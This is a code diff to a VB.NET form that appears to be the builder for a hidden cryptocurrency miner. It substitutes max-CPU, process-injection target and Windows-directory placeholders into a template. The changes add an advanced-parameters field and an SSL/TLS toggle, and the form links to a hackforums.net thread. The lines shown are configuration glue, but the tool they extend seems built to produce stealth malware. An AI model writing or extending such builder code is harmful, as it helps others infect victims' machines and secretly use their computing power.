@@ -86,6 +86,7 @@ Public Class Form1
             builder.Replace("#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
             builder.Replace("#InjectionTarget", InjectionTarget(0))
             builder.Replace("#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
+            builder.Replace("#AdvancedParams", txtAdvParam.Text)
 
 
             txtLog.Text = txtLog.Text + ("Adding injection " + txtInjection.Text + vbNewLine)
@@ -109,6 +110,10 @@ Public Class Form1
 
             If toggleEnableCPU.Checked = True Then
                 builder.Replace("#Const EnableCPU = False", "#Const EnableCPU = True")
+            End If
+
+            If toggleSSLTLS.Checked = True Then
+                builder.Replace("#Const EnableSSLTLS = False", "#Const EnableSSLTLS = True")
             End If
 
             If chkAssembly.Checked = True Then
@@ -346,4 +351,13 @@ Public Class Form1
         Process.Start("https://hackforums.net/showthread.php?tid=5995773")
     End Sub
 
+    Private Sub chkAdvanced_CheckedChanged(sender As Object) Handles chkAdvanced.CheckedChanged
+        If chkAdvanced.Checked = True Then
+            chkAdvanced.Text = "Enabled"
+            txtAdvParam.Enabled = True
+        Else
+            chkAdvanced.Text = "Disabled"
+            txtAdvParam.Enabled = False
+        End If
+    End Sub
 End Class
